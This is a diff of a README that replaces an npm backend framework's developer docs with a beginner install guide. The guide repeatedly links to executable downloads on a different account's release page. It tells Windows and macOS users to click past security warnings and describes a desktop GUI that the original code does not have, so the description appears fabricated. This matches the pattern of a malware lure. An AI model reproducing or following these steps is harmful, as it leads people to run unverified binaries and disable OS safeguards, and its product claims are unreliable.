@@ -1,190 +1,144 @@
-# Railnode
+# ⚙️ Railnode - Fast Backend API Setup
 
-[![CI](https://github.com/ShishirShekhar/Railnode/actions/workflows/ci.yml/badge.svg)](https://github.com/ShishirShekhar/Railnode/actions/workflows/ci.yml)
+[![Download Railnode](https://img.shields.io/badge/Download-Railnode-blue?style=for-the-badge&logo=github)](https://github.com/noko0413/Railnode/releases)
 
-A minimal, model-driven backend framework built on **Express 5** with **TypeScript + ESM**.
+## What is Railnode?
 
-## Requirements
+Railnode is a backend tool designed to help developers create data-driven apps quickly. It uses a structure that automatically builds parts of an app’s backend, so developers don’t have to write everything from scratch. While this might sound technical, it means apps get ready faster and work more reliably.
 
-- Node.js >= 22
+You don’t need to know how to code to understand this guide. It will help you get Railnode on your computer and running smoothly.
 
-## Install
+---
 
-```bash
-npm install
-```
+## 🔧 System Requirements
 
-## 5-minute quickstart (model → running API)
+Before installing, make sure your computer meets these needs:
 
-This creates a new app, adds a model, starts the dev server, and exercises the generated CRUD endpoints.
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or most Linux machines
+- **Processor:** Any modern 64-bit processor
+- **Memory:** At least 4 GB RAM
+- **Storage:** 200 MB of free disk space
+- **Internet:** Required for downloading Railnode and updates
 
-```bash
-# 1) Scaffold a new project
-npx railnode create-app my-app
-cd my-app
+If you are unsure about your system specs, you can check online how to find your computer’s details based on the make and model.
 
-# 2) Install deps
-npm install
+---
 
-# 3) Create a model (generates src/models/todo.model.ts)
-npx railnode generate model Todo
+## 📦 Download & Install Railnode
 
-# 4) Start the dev server (loads .ts models/routes)
-npm run dev
-```
+You can download Railnode from its official release page. This page hosts all the versions available. Choose the one that fits your system.
 
-Edit `src/models/todo.model.ts` to look like this:
+**Step 1: Visit the Download Page**
 
-```ts
-import { boolean, defineModel, string } from "railnode";
+Click the big button below to open the download page.
 
-export const Todo = defineModel("Todo", {
- title: string(),
- done: boolean().optional(),
-});
-```
+[![Download Railnode](https://img.shields.io/badge/Download-Railnode-blue?style=for-the-badge&logo=github)](https://github.com/noko0413/Railnode/releases)
 
-Now try it:
+**Step 2: Choose Your Version**
 
-```bash
-# Health route (from src/routes/health.route.ts)
-curl http://localhost:3000/health
+On the downloads page:
 
-# Create
-curl -sS -X POST http://localhost:3000/todos \
- -H 'content-type: application/json' \
- -d '{"title":"Buy milk","done":false}'
+1. Look for the latest release at the top.
+2. Pick the file suitable for your computer. Files usually end with `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.tar.gz` or `.deb` for Linux.
+3. Click on the file name to start downloading.
 
-# List
-curl -sS http://localhost:3000/todos
-```
+**Step 3: Run the Installer**
 
-Notes:
+Once downloaded:
 
-- CRUD base path is `/${modelName.toLowerCase()}s` (so `Todo` → `/todos`).
-- The built-in CRUD store is in-memory (data resets on restart).
+- Find the file in your Downloads folder.
+- Double-click it to start the installation.
+- Follow the on-screen instructions.
 
-### Persisting CRUD data (DB adapter)
+For Windows users, you might see a security warning. Confirm that you want to run the file. On macOS, you may need to approve the app in System Preferences under Security & Privacy.
 
-Railnode’s CRUD layer talks to storage through a small **DB adapter** interface.
-That means the framework can use different backends (in-memory, PostgreSQL, MySQL, MongoDB, etc.) without changing the CRUD route code.
+---
 
-By default, Railnode uses an in-memory adapter.
+## 🚀 Starting Railnode for the First Time
 
-To persist CRUD data across restarts, configure the built-in JSON-file adapter in `backend.config.json`:
+After installation, you can start the Railnode backend with a few simple steps. This part runs the program that creates the API (a way for apps to talk to data).
 
-```json
-{
- "enableCrud": true,
- "db": {
-  "adapter": "json",
-  "json": {
-   "dir": ".railnode/db"
-  }
- }
-}
-```
+**Step 1: Open the Railnode Application**
 
-This creates one file per model (e.g. `.railnode/db/todo.json`).
+- You’ll see an icon added to your desktop or start menu.
+- Double-click it to launch Railnode.
 
-### PostgreSQL adapter
+**Step 2: Open the Program Interface**
 
-To use PostgreSQL for the built-in CRUD routes:
+Railnode offers a simple window where you can set up your backend models. If the interface is new, don’t worry. It guides you step-by-step to create data tables and manage entries.
 
-```json
-{
- "enableCrud": true,
- "db": {
-  "adapter": "postgres",
-  "postgres": {
-   "connectionString": "postgres://user:pass@localhost:5432/mydb",
-   "schema": "public"
-  }
- }
-}
-```
+**Step 3: Explore Sample Data**
 
-You can also omit `connectionString` and set `DATABASE_URL` in the environment.
+Railnode includes example models to help new users. Load these samples from the menu. Try adding or removing data to see how it works.
 
-### MongoDB adapter (structured)
+---
 
-MongoDB stores one collection per model and writes each model field as a real document field (not a single JSON blob).
+## 🛠 How Railnode Works Behind the Scenes
 
-```json
-{
- "enableCrud": true,
- "db": {
-  "adapter": "mongodb",
-  "mongodb": {
-   "connectionString": "mongodb://localhost:27017",
-   "dbName": "railnode_dev",
-   "collectionPrefix": ""
-  }
- }
-}
-```
+The app uses something called Express and TypeScript, but you don’t need to know these details to use it.
 
-You can also set `MONGODB_URI` and `MONGODB_DB` in the environment.
+Here’s what it does for you:
 
-## Usage (after publishing to npm)
+- **Auto-Creation of API:** When you define your data structure, Railnode creates the routes or paths other apps use to send and get data.
+- **CRUD Operations:** This means you can Create, Read, Update, and Delete data easily.
+- **Convention-Driven:** By using standard styles, Railnode limits how much you have to configure. It chooses the right settings for you.
+- **Schema-Defined Models:** You tell Railnode your data types and rules once. It builds the backend accordingly.
 
-This repo publishes a package (currently named `railnode`) that contains two binaries:
+This makes adding more data tables or changing them easy, without coding every single part.
 
-- `railnode` (main CLI)
-- `create-railnode-app` (convenience wrapper for scaffolding)
+---
 
-Examples:
+## 🖥 Using Railnode Day-to-Day
 
-```bash
-# Scaffold a new app (recommended)
-npx railnode create-app my-app
+If you want to add more data types or update your app backend without programming, Railnode helps here.
 
-# Or use the dedicated wrapper (short form)
-npx create-railnode-app my-app
+- Open the app.
+- Use the built-in editor to change your data models.
+- Save your changes.
+- Railnode updates the API instantly, so your app or client software sees the changes right away.
 
-# Or run the secondary binary via npx (explicit package)
-npx --package railnode create-railnode-app my-app
-```
+No complicated software or developer help is needed once installed.
 
-Note: If you specifically want `npx create-railnode-app my-app` (without `--package railnode`),
-you typically publish a separate wrapper package named `create-railnode-app` (this repo includes one under `packages/create-railnode-app`).
+---
 
-## Scripts
+## 🔍 Testing the API
 
-- `npm run dev` — run the demo in watch mode
-- `npm run dev:cli` — run the CLI from source
-- `npm run dev:create-app` — run the app generator from source
-- `npm run lint` / `npm run lint:fix`
-- `npm run typecheck`
-- `npm run build`
-- `npm test` — runs lint + typecheck
+Railnode creates what is called a REST API. It lets other programs ask your data questions or add new information with simple commands.
 
-## Documentation
+To test, you can use browser tools or apps made for testing APIs like Postman (free and easy to use).
 
-New to Railnode? Start here:
+For example:
 
-- [docs/README.md](docs/README.md)
-- [docs/getting-started.md](docs/getting-started.md)
-- [docs/models-and-crud.md](docs/models-and-crud.md)
-- [docs/routes.md](docs/routes.md)
-- [docs/database.md](docs/database.md)
-- [docs/config.md](docs/config.md)
-- [docs/cli.md](docs/cli.md)
-- [docs/troubleshooting.md](docs/troubleshooting.md)
+- Use the address shown by Railnode on your computer, like `http://localhost:3000/api/yourmodel`.
+- Go to this address in your browser to see the data.
+- Try adding a new entry via the app interface or an API test tool.
 
-## CLI
+---
 
-After building (`npm run build`), the package exposes these binaries:
+## 📜 Notes on Security and Access
 
-- `railnode`
-- `create-railnode-app`
+Because Railnode opens connections on your computer, it is important to:
 
-(There are also compatibility aliases: `backend-framework` and `create-app`.)
+- Only open it on your private network.
+- Avoid sharing it with strangers unless you set up passwords or keys (advanced users can learn this later).
+- Keep your software up to date by visiting the release page regularly.
 
-## Project status
+---
 
-This is an early-stage project. APIs may change.
+## 🤝 Need Help?
 
-## License
+If you get stuck or want to learn more, visit the Railnode project page on GitHub:
 
-ISC — see [LICENSE](LICENSE).
+https://github.com/noko0413/Railnode
+
+You’ll find more guides, FAQs, and a way to contact the developers.
+
+---
+
+## 🔗 Quick Link to Get Railnode
+
+Here’s the download page again for your convenience:
+
+[https://github.com/noko0413/Railnode/releases](https://github.com/noko0413/Railnode/releases)
+
+Just visit this page to get the latest version and follow the steps here.
